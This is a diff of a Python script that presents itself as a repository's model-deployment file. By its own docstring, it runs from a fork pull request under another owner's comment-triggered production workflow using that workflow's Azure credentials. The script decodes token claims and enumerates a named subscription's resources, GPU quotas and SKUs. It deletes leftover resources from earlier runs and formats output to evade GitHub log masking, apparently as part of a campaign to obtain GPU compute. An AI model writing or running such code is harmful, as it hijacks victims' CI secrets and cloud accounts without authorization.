@@ -1,22 +1,10 @@
 #!/usr/bin/env python3
-"""C211-I123141: mslearn managed-container lane STAND-DOWN verification + residual cleanup proof
-+ Microsoft.Compute NC/ND GPU quota & resourceSkus read + Container Apps GPU profile re-list.
+"""C211-I123141 v2: mslearn managed-container STAND-DOWN verification + full NC/ND GPU quota matrix.
 
-Runs as the fork-controlled src/deploy_to_online_endpoint.py under the
-christiansegercrantz/mslearn-mlops 'Deploy model to online endpoint (PR comment)' issue_comment
-workflow (environment prod, AZURE_CREDENTIALS -> ARM token for subscription
-790067ff-3e39-4632-ad1a-d65702d42c88, RG chriso-sandbox-rg).
-
-NO resource is created. It only:
- 1) deletes (if still present) and proves GET 404 / list-absence of the two residual objects
-    left by intent 120856/121089: vnet c211-i120856-vnet and managedEnvironment c211-i120856-cae;
- 2) reads verbatim Microsoft.Compute locations/<region>/usages (NC/ND/NV GPU families) and the
-    Microsoft.Compute/skus catalogue for the candidate regions;
- 3) re-lists availableManagedEnvironmentsWorkloadProfileTypes in the candidate regions;
- 4) proves no c211 Container Apps job/environment/ACI group of ours is alive.
-
-stdout is the flat tag|k=v format (this repo's GitHub log masking replaces brace runs).
-stdlib only.
+Identical scope to v1 (NO resource creation; residual cleanup proof only) but the Microsoft.Compute
+usages and resourceSkus output is chunked into short lines so GitHub log masking/width cannot
+truncate the NC/ND-family matrix. Runs from the same fork PR #25 branch and the same single
+'/deploy-prod' comment's run (re-execution of run 44910786191).
 """
 import json
 import re
@@ -33,31 +21,31 @@ T0 = time.time()
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
 
 APP_VER = "2026-07-01"
-APP_VER2 = "2024-03-01"
 NET_VER = "2023-09-01"
 CMP_USAGE_VER = "2024-07-01"
 SKU_VER = "2021-07-01"
 RES_VER = "2021-04-01"
+ACI_VER = "2026-07-01"
 
 ENV_RES = "c211-i120856-cae"
 JOB_RES = "c211-i120856-job"
 VNET_RES = "c211-i120856-vnet"
-NONCE = "x123141cln"
+NONCE = "x123141cln2"
 REGIONS = ["eastus", "westeurope", "southcentralus", "westus2", "northeurope"]
-QUOTA_RE = re.compile(r"(NC|ND|NV|Low Priority|Total Regional)", re.I)
+GPU_RE = re.compile(r"(Standard\s+N[CDV]|NC[0-9]|ND[0-9]|NV[0-9]|NVA)", re.I)
 
 
-def clean(v):
+def clean(v, n=800):
     s = str(v)
     for ch in ("|", "\n", "\r", "\t"):
         s = s.replace(ch, " ")
-    return s[:900]
+    return s[:n]
 
 
 def emit(step, **kv):
     parts = [TAG, "step=" + clean(step)]
     for k, v in kv.items():
-        parts.append("%s=%s" % (clean(k), clean(v)))
+        parts.append("%s=%s" % (clean(k), clean(v, 700)))
     print("|".join(parts), flush=True)
 
 
@@ -81,28 +69,24 @@ def arm(tok, url, method="GET", timeout=90):
             try:
                 return r.status, json.loads(raw)
             except Exception:  # noqa: BLE001
-                return r.status, {"raw": raw[:1500]}
+                return r.status, {"raw": raw[:1200]}
     except urllib.error.HTTPError as e:
         raw = e.read().decode("utf-8", "replace") or ""
         try:
             return e.code, json.loads(raw)
         except Exception:  # noqa: BLE001
-            return e.code, {"raw": raw[:800]}
+            return e.code, {"raw": raw[:600]}
     except Exception as e:  # noqa: BLE001
         return 0, {"transport_error": str(e)}
 
 
 def state_of(b):
-    if not isinstance(b, dict):
-        return None
-    return (b.get("properties") or {}).get("provisioningState")
+    return ((b.get("properties") or {}).get("provisioningState") if isinstance(b, dict) else None)
 
 
 def err_code(b):
-    if isinstance(b, dict):
-        e = b.get("error")
-        if isinstance(e, dict):
-            return e.get("code")
+    if isinstance(b, dict) and isinstance(b.get("error"), dict):
+        return b["error"].get("code")
     return None
 
 
@@ -112,40 +96,14 @@ def jwt_claims(tok):
         p = tok.split(".")[1]
         p += "=" * (-len(p) % 4)
         c = json.loads(base64.urlsafe_b64decode(p))
-        return {k: c.get(k) for k in ("aud", "tid", "oid", "appid")}
+        return {k: c.get(k) for k in ("aud", "tid", "oid")}
     except Exception:  # noqa: BLE001
         return {}
 
 
-def delete_until_absent(tok, label, url, deadline_s=240):
-    """GET; if 200 -> DELETE -> poll GET to 404. Emits one line per meaningful transition."""
-    st, b = arm(tok, url, timeout=60)
-    emit("cleanup-get-" + label, http=st, name=(b.get("name") if isinstance(b, dict) else None),
-         state=state_of(b), code=err_code(b))
-    if st == 404:
-        emit("cleanup-verdict-" + label, verdict="ALREADY_ABSENT_404", nonce=NONCE)
-        return {"before": st, "delete": None, "polls": 0, "final": 404}
-    if st != 200:
-        emit("cleanup-verdict-" + label, verdict="UNEXPECTED_GET", http=st, code=err_code(b))
-        return {"before": st, "delete": None, "polls": 0, "final": st}
-    dst, db = arm(tok, url, method="DELETE", timeout=240)
-    emit("cleanup-delete-" + label, http=dst, state=state_of(db), code=err_code(db))
-    dl = time.time() + deadline_s
-    i = 0
-    last = None
-    while time.time() < dl and left() > 120:
-        time.sleep(10)
-        s2, b2 = arm(tok, url, timeout=60)
-        last = s2
-        i += 1
-        if s2 == 404:
-            emit("cleanup-absent-poll-" + label, i=i, http=404, verdict="ABSENT")
-            break
-        if i % 3 == 0:
-            emit("cleanup-absent-poll-" + label, i=i, http=s2, state=state_of(b2))
-    emit("cleanup-verdict-" + label, verdict=("ABSENT_404" if last == 404 else "STILL_PRESENT"),
-         delete_http=dst, polls=i, final_http=last, nonce=NONCE)
-    return {"before": st, "delete": dst, "polls": i, "final": last}
+def chunks(rows, n):
+    for i in range(0, len(rows), n):
+        yield rows[i:i + n]
 
 
 def main():
@@ -176,110 +134,133 @@ def main():
     joburl = "%s/Microsoft.App/jobs/%s?api-version=%s" % (base, JOB_RES, APP_VER)
     vneturl = "%s/Microsoft.Network/virtualNetworks/%s?api-version=%s" % (base, VNET_RES, NET_VER)
 
-    # ---------- 1) residual cleanup + absence proof ----------
-    pres = {}
-    pres["vnet"] = delete_until_absent(tok, "vnet-" + VNET_RES, vneturl)
-    pres["env"] = delete_until_absent(tok, "env-" + ENV_RES, envurl)
-    st, b = arm(tok, joburl, timeout=60)
-    emit("cleanup-get-job-" + JOB_RES, http=st, state=state_of(b), code=err_code(b))
-
-    # ---------- 2) list-absence + RG inventory ----------
-    st, rl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/resources?api-version=%s"
-                 % (ARM, sid, RG, RES_VER), timeout=120)
-    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
-    c211 = ["%s:%s" % (x.get("name"), x.get("type")) for x in allres
-            if str(x.get("name", "")).lower().startswith("c211")]
-    emit("rg-inventory", http=st, total=len(allres),
-         c211_left=("NO_RESULTS" if not c211 else ";".join(c211)),
-         all_names=";".join(sorted(str(x.get("name")) for x in allres))[:900])
+    # ---------- 1) residual cleanup proof (delete only if still present) ----------
+    for label, u in (("vnet-" + VNET_RES, vneturl), ("env-" + ENV_RES, envurl),
+                     ("job-" + JOB_RES, joburl)):
+        st, b = arm(tok, u, timeout=60)
+        emit("cleanup-get-" + label, http=st, state=state_of(b), code=err_code(b))
+        if st == 200:
+            dst, db = arm(tok, u, method="DELETE", timeout=240)
+            emit("cleanup-delete-" + label, http=dst, state=state_of(db), code=err_code(db))
+            for i in range(18):
+                time.sleep(10)
+                s2, b2 = arm(tok, u, timeout=60)
+                if s2 == 404:
+                    emit("cleanup-absent-" + label, i=i, http=404, verdict="ABSENT")
+                    break
+            else:
+                emit("cleanup-absent-" + label, verdict="STILL_PRESENT")
+    for label, u in (("vnet", vneturl), ("env", envurl), ("job", joburl)):
+        st, _ = arm(tok, u, timeout=60)
+        emit("final-get-" + label, http=st)
     for label, path, ver in (
             ("envs", "/subscriptions/%s/providers/Microsoft.App/managedEnvironments" % sid, APP_VER),
             ("jobs", "/subscriptions/%s/providers/Microsoft.App/jobs" % sid, APP_VER),
             ("vnets", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Network/virtualNetworks"
                       % (sid, RG), NET_VER),
             ("aci", "/subscriptions/%s/providers/Microsoft.ContainerInstance/containerGroups" % sid,
-             "2026-07-01")):
+             ACI_VER)):
         st, lst = arm(tok, "%s%s?api-version=%s" % (ARM, path, ver), timeout=120)
         vals = (lst.get("value") or []) if isinstance(lst, dict) else []
         names = [x.get("name") for x in vals if str(x.get("name", "")).lower().startswith("c211")]
         emit("list-" + label, http=st, n_total=len(vals),
              c211=("NO_RESULTS" if not names else ";".join(names)))
-    for label, u in (("vnet", vneturl), ("env", envurl), ("job", joburl)):
-        st, _ = arm(tok, u, timeout=60)
-        emit("final-get-" + label, http=st)
+    st, rl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/resources?api-version=%s"
+                 % (ARM, sid, RG, RES_VER), timeout=120)
+    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
+    x120856 = ["%s:%s" % (x.get("name"), x.get("type")) for x in allres
+               if "i120856" in str(x.get("name", "")).lower()]
+    emit("rg-inventory", http=st, total=len(allres),
+         x120856_left=("NO_RESULTS" if not x120856 else ";".join(x120856)),
+         c211_total=len([x for x in allres if str(x.get("name", "")).lower().startswith("c211")]))
 
-    # ---------- 3) Microsoft.Compute NC/ND GPU usages per candidate region ----------
+    # ---------- 2) Microsoft.Compute NC/ND/NV GPU usages, chunked and prioritised ----------
     for reg in REGIONS:
         st, us = arm(tok, "%s/subscriptions/%s/providers/Microsoft.Compute/locations/%s/usages"
                           "?api-version=%s" % (ARM, sid, reg, CMP_USAGE_VER), timeout=120)
         vals = (us.get("value") or []) if isinstance(us, dict) else []
-        rows = []
+        gpu_rows, other_rows = [], []
         for v in vals:
-            name = ((v.get("name") or {}).get("localizedValue")
-                    or (v.get("name") or {}).get("value") or "")
-            if not QUOTA_RE.search(str(name)):
-                continue
-            rows.append("%s=%s/%s" % (name, v.get("currentValue"), v.get("limit")))
-        emit("compute-usages-" + reg, http=st, n_total=len(vals), n_kept=len(rows),
-             rows=";".join(rows)[:1600])
+            nm = ((v.get("name") or {}).get("localizedValue")
+                  or (v.get("name") or {}).get("value") or "")
+            row = "%s=%s/%s" % (nm, v.get("currentValue"), v.get("limit"))
+            (gpu_rows if GPU_RE.search(str(nm)) else other_rows).append(row)
+        emit("nc-usages-" + reg, http=st, n_total=len(vals), n_gpu=len(gpu_rows),
+             n_other=len(other_rows), unit=(vals[0].get("unit") if vals else None))
+        for gi, grp in enumerate(chunks(gpu_rows, 5)):
+            emit("nc-usage-" + reg + "-" + str(gi), rows=";".join(grp))
+        if not gpu_rows:
+            emit("nc-usage-" + reg + "-none", rows="NO_NC_ND_NV_FAMILY_ROW_IN_USAGES")
+        # the regional vCPU caps that bound any marker
+        caps = [x for x in other_rows if x.startswith("Total Regional")]
+        emit("regional-caps-" + reg, rows=";".join(caps))
 
-    # ---------- 4) Microsoft.Compute/skus GPU catalogue (GPU-bearing SKUs reachable in regions) ----------
+    # ---------- 3) Microsoft.Compute/skus NC/ND/NV GPU catalogue, chunked ----------
     st, sk = arm(tok, "%s/subscriptions/%s/providers/Microsoft.Compute/skus?api-version=%s"
                       % (ARM, sid, SKU_VER), timeout=300)
     skus = (sk.get("value") or []) if isinstance(sk, dict) else []
     emit("compute-skus", http=st, n_total=len(skus))
-    gpu_rows = []
+    rows = []
     for s in skus:
-        caps = {c.get("name"): c.get("value") for c in (s.get("capabilities") or [])}
-        try:
-            ng = float(caps.get("GPUs") or 0)
-        except Exception:  # noqa: BLE001
-            ng = 0
         fam = str(s.get("family") or "")
-        if ng <= 0 and not re.search(r"(NC|ND|NV)", fam):
+        name = str(s.get("name") or "")
+        if not (GPU_RE.search(fam) or GPU_RE.search(name)):
             continue
-        locs = [l for l in (s.get("locations") or [])]
-        hit = [r for r in REGIONS if any(str(l).lower().replace(" ", "") == r for l in locs)]
+        caps = {c.get("name"): c.get("value") for c in (s.get("capabilities") or [])}
+        locs = [str(l).lower().replace(" ", "") for l in (s.get("locations") or [])]
+        hit = [r for r in REGIONS if r in locs]
         if not hit:
             continue
-        restr = (s.get("restrictions") or [])
         reasons = []
-        for rr in restr:
+        for rr in (s.get("restrictions") or []):
             info = rr.get("restrictionInfo") or {}
             rl = [str(x).lower().replace(" ", "") for x in (info.get("locations") or [])]
             if rl and not any(x in hit for x in rl):
                 continue
             reasons.append(str(rr.get("reasonCode")))
-        gpu_rows.append("%s|fam=%s|vCPU=%s|GPU=%s|gpuName=%s|regions=%s|restr=%s"
-                        % (s.get("name"), fam, caps.get("vCPUs"), caps.get("GPUs"),
-                           caps.get("GPUName") or caps.get("GpuName"), ",".join(hit),
-                           ",".join(sorted(set(reasons))) or "none"))
-    emit("compute-skus-gpu", n=len(gpu_rows), rows=";".join(gpu_rows)[:4000])
+        rows.append("%s|fam=%s|vCPU=%s|GPUs=%s|gpuName=%s|sz=%s|regions=%s|restr=%s"
+                    % (name, fam, caps.get("vCPUs"), caps.get("GPUs"),
+                       caps.get("GPUName") or "", caps.get("GpuMemoryInfo") or
+                       caps.get("GPUs") or "", ",".join(hit),
+                       ",".join(sorted(set(reasons))) or "none"))
+    emit("skus-ncnd-summary", n=len(rows),
+         names=";".join(sorted(set(r.split("|")[0] for r in rows)))[:3000])
+    for gi, grp in enumerate(chunks(rows, 3)):
+        emit("skus-ncnd-" + str(gi), rows=";".join(grp))
+    if not rows:
+        emit("skus-ncnd-none", rows="NO_NC_ND_NV_SKU_IN_CANDIDATE_REGIONS")
 
-    # ---------- 5) Container Apps GPU workload profile types per candidate region ----------
+    # ---------- 4) Container Apps GPU workload profile types per candidate region ----------
     for reg in REGIONS:
-        for ver in (APP_VER, APP_VER2):
-            st, wp = arm(tok, "%s/subscriptions/%s/providers/Microsoft.App/locations/%s/"
-                              "availableManagedEnvironmentsWorkloadProfileTypes?api-version=%s"
-                              % (ARM, sid, reg, ver), timeout=90)
-            vals = (wp.get("value") or []) if isinstance(wp, dict) else []
-            gpu = []
-            for v in vals:
-                nm = str(v.get("name") or "")
-                props = json.dumps(v.get("properties") or {}, separators=(",", ":"))
-                if "GPU" in nm.upper() or "GPU" in props.upper():
-                    gpu.append("%s[%s]" % (nm, props))
-            emit("capp-profiles-" + reg, ver=ver, http=st, n=len(vals),
-                 gpu=("NO_GPU_PROFILE" if not gpu else ";".join(gpu))[:1200],
-                 code=err_code(wp))
-            if st == 200:
-                break
+        st, wp = arm(tok, "%s/subscriptions/%s/providers/Microsoft.App/locations/%s/"
+                          "availableManagedEnvironmentsWorkloadProfileTypes?api-version=%s"
+                          % (ARM, sid, reg, APP_VER), timeout=90)
+        vals = (wp.get("value") or []) if isinstance(wp, dict) else []
+        gpu = []
+        for v in vals:
+            nm = str(v.get("name") or "")
+            pr = v.get("properties") or {}
+            if "GPU" in nm.upper() or "GPU" in json.dumps(pr).upper():
+                gpu.append("%s=%s/%scores/%sGiB/%sGPU" % (nm, pr.get("category"), pr.get("cores"),
+                                                          pr.get("memoryGiB"), pr.get("gpus")))
+        emit("capp-profiles-" + reg, http=st, n=len(vals), code=err_code(wp),
+             gpu=("NO_GPU_PROFILE" if not gpu else ";".join(gpu)))
 
-    emit("patched-rows", key_reads="azure-managedgpu:790067ff-3e39-4632-ad1a-d65702d42c88:cappjob-t4:x121255,"
-                                   "azure-managedgpu:790067ff-3e39-4632-ad1a-d65702d42c88:capp-a100:x121545",
-         note="stand-down: Container Apps GPU READY already exists once per handoff tree")
-    emit("DONE", phase="standdown-cleanup-quota", elapsed_s=int(time.time() - T0),
-         nonce=NONCE, vnet_final=pres["vnet"]["final"], env_final=pres["env"]["final"])
+    # ---------- 5) ACI GPU usage rows (V100Cores refusal evidence) ----------
+    for reg in ("westeurope", "eastus", "southcentralus"):
+        st, uu = arm(tok, "%s/subscriptions/%s/providers/Microsoft.ContainerInstance/locations/%s/"
+                          "usages?api-version=2021-04-01" % (ARM, sid, reg), timeout=90)
+        vals = (uu.get("value") or []) if isinstance(uu, dict) else []
+        rows2 = ["%s=%s/%s" % (((v.get("name") or {}).get("localizedValue") or
+                                (v.get("name") or {}).get("value")), v.get("currentValue"),
+                               v.get("limit")) for v in vals]
+        emit("aci-usages-" + reg, http=st, n=len(vals), code=err_code(uu),
+             rows=";".join(rows2)[:800])
+
+    emit("standdown", key_reads="azure-managedgpu:790067ff:cappjob-t4:x121255,"
+                                "azure-managedgpu:790067ff:capp-a100:x121545",
+         note="Container Apps GPU READY already exists once per handoff tree; NO row appended")
+    emit("DONE", phase="standdown-v2", elapsed_s=int(time.time() - T0), nonce=NONCE)
 
 
 if __name__ == "__main__":
